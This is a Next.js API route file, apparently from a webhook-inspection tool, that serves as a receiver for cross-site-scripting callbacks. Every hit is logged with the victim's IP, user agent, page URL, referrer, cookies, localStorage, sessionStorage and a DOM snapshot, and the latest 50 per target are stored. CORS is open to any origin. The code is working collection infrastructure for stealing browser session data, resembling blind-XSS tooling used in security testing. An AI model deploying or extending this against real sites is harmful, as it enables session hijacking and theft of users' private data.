import { kv } from '@vercel/kv';
import { NextResponse } from 'next/server';

// Initialize global in-memory store for local development if Vercel KV is not connected
if (!global._webhooksStore) {
  global._webhooksStore = {
    requests: {},
    configs: {},
    counts: {},
    xss: {} // New XSS storage node
  };
} else if (!global._webhooksStore.xss) {
  global._webhooksStore.xss = {};
}

function generateXssId() {
  if (typeof crypto !== 'undefined' && crypto.randomUUID) {
    return crypto.randomUUID();
  }
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

export async function POST(request) {
  const { searchParams } = new URL(request.url);
  const id = searchParams.get('id');

  if (!id) {
    return NextResponse.json({ success: false, error: 'Missing target ID parameter' }, { status: 400 });
  }

  try {
    // 1. Get client IP
    let ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || '127.0.0.1';
    if (ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }

    // 2. Parse Incoming JSON payload
    let payload = {};
    try {
      payload = await request.json();
    } catch (e) {
      // In case sendBeacon sends plain text
      try {
        const text = await request.text();
        payload = JSON.parse(text);
      } catch (err) {
        return NextResponse.json({ success: false, error: 'Malformed JSON payload' }, { status: 400 });
      }
    }

    // 3. Construct XSS log entry
    const xssLog = {
      triggerId: generateXssId(),
      timestamp: new Date().toISOString(),
      ip,
      userAgent: request.headers.get('user-agent') || 'Unknown',
      uri: payload.uri || 'Unknown Location',
      referrer: payload.ref || 'None',
      cookies: payload.cookies || 'None (or HTTP-Only)',
      localStorage: payload.local || '{}',
      sessionStorage: payload.session || '{}',
      dom: payload.dom || '[No DOM Captured]',
    };

    // 4. Save to Redis or In-Memory
    const isKvConnected = !!process.env.KV_URL;
    
    if (isKvConnected) {
      const xssKey = `xss:${id}:triggers`;
      await kv.lpush(xssKey, JSON.stringify(xssLog));
      await kv.ltrim(xssKey, 0, 49); // Keep latest 50 XSS hits
    } else {
      // In-Memory Fallback
      const store = global._webhooksStore;
      if (!store.xss) store.xss = {};
      if (!store.xss[id]) store.xss[id] = [];
      
      store.xss[id].unshift(xssLog);
      store.xss[id] = store.xss[id].slice(0, 50); // Keep last 50
    }

    return new NextResponse(JSON.stringify({ success: true, message: 'XSS Callback captured' }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });

  } catch (error) {
    console.error('XSS callback ingestion error:', error);
    return NextResponse.json({ success: false, error: 'Internal receiver error' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
